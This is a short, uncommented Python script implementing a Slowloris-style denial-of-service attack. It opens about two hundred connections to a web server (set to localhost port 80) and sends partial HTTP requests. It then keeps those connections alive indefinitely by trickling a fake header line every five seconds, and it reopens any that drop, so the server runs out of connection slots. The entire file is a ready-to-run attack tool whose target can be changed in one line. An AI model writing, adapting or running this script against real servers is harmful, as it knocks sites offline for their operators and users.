import os
import socket
import sys
import random
import time
import string


test_headers = [
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
   "Accept-Language: de,en-US;q=0.7,en;q=0.3"
]


ip = '127.0.0.1'
port = 80

opened_socket = False

def set_socket(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, port))
    time.sleep(0.1)
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(1, 1000)).encode("utf-8"))
    for i in test_headers:
        s.send("{}\r\n".format(i).encode("utf-8"))
    print(s)
    return s

def open_multiple_sockets(ip, port):

    socket_list = []

    c = 0
    while c <= 200:
        socket_thing = set_socket(ip, port)
        socket_list.append(socket_thing)
        c+=1


    #s = set_socket(ip, port)
    opened_socket = True

    while True:
        time.sleep(5)
        for s in socket_list:
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 2000)).encode('utf-8'))
                print("SEND NEW BYTE")
            except socket.error:
                socket_list.remove(s)
                print("Only: " + str(len(socket_list)) + " sockets left")
                socket_list.append(set_socket(ip, port))
                print("NEW SOCKET")

#set_socket(ip, port)
open_multiple_sockets(ip, port)